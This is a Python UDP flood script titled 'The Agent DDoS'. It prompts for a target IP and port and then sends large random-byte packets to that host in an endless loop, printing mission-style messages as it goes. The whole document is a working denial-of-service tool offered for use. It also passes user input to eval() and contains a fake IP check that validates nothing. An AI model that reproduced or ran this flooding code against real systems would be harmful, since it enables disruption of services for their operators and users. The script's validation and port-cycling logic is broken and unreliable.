#Lets import modules
import sys
import os
import time
import socket
import scapy.all as scapy
import random
import threading
from django.core.validators import URLValidator
from django.core.exceptions import ValidationError

validate = URLValidator()

#Lets start coding
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

#Lets define sock and bytes
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(12000)
os.system("clear")
#Banner :
print('''
 
    
$$$$$$$$\ $$\                        $$$$$$\                                 $$\           $$$$$$$\  $$$$$$$\             $$$$$$\  
\__$$  __|$$ |                      $$  __$$\                                $$ |          $$  __$$\ $$  __$$\           $$  __$$\ 
   $$ |   $$$$$$$\   $$$$$$\        $$ /  $$ | $$$$$$\   $$$$$$\  $$$$$$$\ $$$$$$\         $$ |  $$ |$$ |  $$ | $$$$$$\  $$ /  \__|
   $$ |   $$  __$$\ $$  __$$\       $$$$$$$$ |$$  __$$\ $$  __$$\ $$  __$$\\_$$  _|        $$ |  $$ |$$ |  $$ |$$  __$$\ \$$$$$$\  
   $$ |   $$ |  $$ |$$$$$$$$ |      $$  __$$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ | $$ |          $$ |  $$ |$$ |  $$ |$$ /  $$ | \____$$\ 
   $$ |   $$ |  $$ |$$   ____|      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ | $$ |$$\       $$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |
   $$ |   $$ |  $$ |\$$$$$$$\       $$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ |  $$ | \$$$$  |      $$$$$$$  |$$$$$$$  |\$$$$$$  |\$$$$$$  |
   \__|   \__|  \__| \_______|      \__|  \__| \____$$ | \_______|\__|  \__|  \____/       \_______/ \_______/  \______/  \______/ 
                                              $$\   $$ |                                                                           
                                              \$$$$$$  |                                                                           
                                               \______/                                                                            
   
   
   ''')
#Type your ip and port number (find IP address using nslookup or any online website) 
ip = input(" [+] THE AGENT DDOS WANTS TARGET IP : ")
port = eval(input(" [+] THE AGENT DDOS WANTS TARGET Starting Port NO : "))
os.system("clear")
print('''
   
      
$$$$$$$$\ $$\                        $$$$$$\                                 $$\           $$$$$$$\  $$$$$$$\             $$$$$$\  
\__$$  __|$$ |                      $$  __$$\                                $$ |          $$  __$$\ $$  __$$\           $$  __$$\ 
   $$ |   $$$$$$$\   $$$$$$\        $$ /  $$ | $$$$$$\   $$$$$$\  $$$$$$$\ $$$$$$\         $$ |  $$ |$$ |  $$ | $$$$$$\  $$ /  \__|
   $$ |   $$  __$$\ $$  __$$\       $$$$$$$$ |$$  __$$\ $$  __$$\ $$  __$$\\_$$  _|        $$ |  $$ |$$ |  $$ |$$  __$$\ \$$$$$$\  
   $$ |   $$ |  $$ |$$$$$$$$ |      $$  __$$ |$$ /  $$ |$$$$$$$$ |$$ |  $$ | $$ |          $$ |  $$ |$$ |  $$ |$$ /  $$ | \____$$\ 
   $$ |   $$ |  $$ |$$   ____|      $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ | $$ |$$\       $$ |  $$ |$$ |  $$ |$$ |  $$ |$$\   $$ |
   $$ |   $$ |  $$ |\$$$$$$$\       $$ |  $$ |\$$$$$$$ |\$$$$$$$\ $$ |  $$ | \$$$$  |      $$$$$$$  |$$$$$$$  |\$$$$$$  |\$$$$$$  |
   \__|   \__|  \__| \_______|      \__|  \__| \____$$ | \_______|\__|  \__|  \____/       \_______/ \_______/  \______/  \______/ 
                                              $$\   $$ |                                                                           
                                              \$$$$$$  |                                                                           
                                               \______/                         

	''')
try:
	validate = ip
	print(" THE AGENT CHECKED THE IP = TRUE ")
	print(" [+] THE AGENT IS ON MISSION")
except ValidationError as exception :
	print(" ✘ Input a right url")

#MISSION STARTED
print(" ")
print("   SIR I WILL SEND ARMY OF AGENTS' ")
print(" " )
print(" [+] THE AGENT FOUND THE TARGET , AGENT IS ATTACKING...." + ip )
print (" " )
time.sleep(10)
sent = 0
try :
 while True:
		sock.sendto(bytes, (ip, port))
		sent = sent + 1
		print("\n [+] AGENT DEPLOYED = %s packet to %s throught port:%s"%(sent,ip,port))
		if port == 65534:
			port = 1
except KeyboardInterrupt:
	print(" ")
	print("\n [-] Ctrl+C Detected.........Exiting")
	print(" [+] THE AGENT STOPPED")
input(" Enter To Exit")
os.system("clear")
print(" [-] THE AGENT IS ALWAYS READY")

